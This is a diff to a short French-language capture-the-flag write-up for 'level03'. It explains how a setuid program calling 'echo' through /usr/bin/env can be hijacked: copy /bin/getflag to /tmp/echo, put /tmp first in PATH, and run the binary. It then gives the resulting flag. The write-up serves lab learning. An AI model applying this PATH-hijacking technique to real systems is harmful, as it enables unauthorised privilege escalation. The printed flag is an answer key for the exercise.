@@ -20,11 +20,13 @@ cette utilisation présente une faille décrite ci-dessous:
 As /usr/bin/env searches for the specified binary in the PATH variable, we can just fake the "echo" binary with our own binary to get a shell.
 
 D’ailleurs on retrouve bien ‘getflag’ dans /bin/ on peut faire passé getflag pour echo grace au PATH
+ls /bin/ | grep flag
 
 D’abord, il faut pouvoir modifier le nom de getflag par echo et le sortir de bin. 
 J’utilise encore le dossier /tmp/ 
 	cp /bin/getflag /tmp/echo
 Ensuite, on modifie PATH pour que le binaire aille cherche notre echo dans /tmp/
 	export PATH=/tmp:$PATH
+printenv PATH
 On à plus qu’a run ./level03 pour avoir le flag
 flag: qi0maab88jeaj46qoumi7maus
